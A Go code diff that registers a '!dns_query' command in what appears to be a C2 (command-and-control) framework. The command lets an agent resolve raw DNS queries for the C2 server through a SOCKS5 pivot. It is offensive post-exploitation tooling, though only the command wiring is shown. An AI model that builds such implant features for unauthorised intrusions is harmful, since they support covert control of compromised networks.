@@ -132,6 +132,20 @@ func C2Commands() *cobra.Command {
 	proxyStartCmd.Flags().StringP("target", "", "", "Target to dial, host:port")
 	rootCmd.AddCommand(proxyStartCmd)
 
+	// !dns_query — the C2-side DNS helper asks this agent to resolve a DNS
+	// question (the raw query packet rides in --query). The agent replies with
+	// a full DNS response packet so the C2 can answer its local DNS client.
+	dnsQueryCmd := &cobra.Command{
+		Use:     def.C2CmdDNSQuery,
+		Short:   "Resolve a DNS question on behalf of the C2 DNS helper (SOCKS5 pivot)",
+		Example: "!dns_query --token <token> --query <base64>",
+		GroupID: "generic",
+		Run:     dnsQueryCmdRun,
+	}
+	dnsQueryCmd.Flags().StringP("token", "", "", "Query token (ties the answer to the C2 DNS request)")
+	dnsQueryCmd.Flags().StringP("query", "", "", "Base64-encoded raw DNS query packet")
+	rootCmd.AddCommand(dnsQueryCmd)
+
 	platformCommands(rootCmd)
 
 	return rootCmd
